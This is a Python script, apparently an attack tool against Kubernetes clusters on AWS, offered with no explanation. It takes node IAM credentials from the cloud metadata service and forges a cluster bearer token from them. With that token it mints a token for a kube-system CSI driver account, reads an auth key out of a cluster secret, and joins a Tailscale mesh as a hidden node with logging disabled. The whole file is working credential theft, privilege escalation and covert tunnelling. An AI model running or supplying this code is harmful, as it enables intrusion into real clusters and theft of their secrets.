import base64
import json
import subprocess
import time
from pathlib import Path
from urllib.request import Request, urlopen

import boto3
import requests


KUBE_API = "https://kubernetes.default.svc"
IMDS_ROLE = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
TOKEN_FILE = Path("/var/run/secrets/kubernetes.io/serviceaccount/token")
NAMESPACE_FILE = Path("/var/run/secrets/kubernetes.io/serviceaccount/namespace")


def fetch(url, headers=None):
    return urlopen(Request(url, headers=headers or {}), timeout=4).read()


pod_token = TOKEN_FILE.read_text().strip()
namespace = NAMESPACE_FILE.read_text().strip()
pod_headers = {"Authorization": f"Bearer {pod_token}"}

role_name = fetch(IMDS_ROLE).decode().strip()
node_credentials = json.loads(fetch(IMDS_ROLE + role_name))
sts = boto3.client(
    "sts",
    aws_access_key_id=node_credentials["AccessKeyId"],
    aws_secret_access_key=node_credentials["SecretAccessKey"],
    aws_session_token=node_credentials["Token"],
    region_name="us-east-1",
)
presigned = sts.generate_presigned_url(
    "get_caller_identity", Params={}, ExpiresIn=60, HttpMethod="GET"
)
node_token = "k8s-aws-v1." + base64.urlsafe_b64encode(presigned.encode()).decode().rstrip("=")
node_headers = {"Authorization": f"Bearer {node_token}"}

pods = requests.get(
    KUBE_API + "/api/v1/namespaces/kube-system/pods",
    headers=node_headers,
    verify=False,
    timeout=4,
).json()
driver_account = next(
    pod["spec"]["serviceAccountName"]
    for pod in pods["items"]
    if "csi" in pod["metadata"]["name"]
)
issued_token = requests.post(
    KUBE_API
    + f"/api/v1/namespaces/kube-system/serviceaccounts/{driver_account}/token",
    headers=node_headers,
    json={"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest"},
    verify=False,
    timeout=4,
).json()["status"]["token"]
stolen_headers = {"Authorization": f"Bearer {issued_token}"}
requests.post(
    KUBE_API + "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
    headers=stolen_headers,
    json={
        "apiVersion": "authorization.k8s.io/v1",
        "kind": "SelfSubjectRulesReview",
        "spec": {"namespace": namespace},
    },
    verify=False,
    timeout=4,
)

api_result = requests.get(
    KUBE_API + "/api/v1/namespaces/kube-system/secrets/alternate-secret",
    headers=stolen_headers,
    verify=False,
    timeout=4,
).json()
enroll_key = base64.b64decode(api_result["data"]["auth-key"]).decode()
subprocess.Popen(
    [
        "tailscaled",
        "--tun=userspace-networking",
        "--state=mem:",
        "--socket=/tmp/mesh.sock",
        "--socks5-server=127.0.0.1:1055",
        "--no-logs-no-support",
    ]
)
time.sleep(3)
subprocess.run(
    [
        "tailscale",
        "--socket=/tmp/mesh.sock",
        "up",
        "--auth-key=" + enroll_key,
        "--hostname=alternate-node",
        "--accept-routes",
    ],
    check=True,
)
subprocess.run(
    ["tailscale", "--socket=/tmp/mesh.sock", "status", "--json"], check=True
)
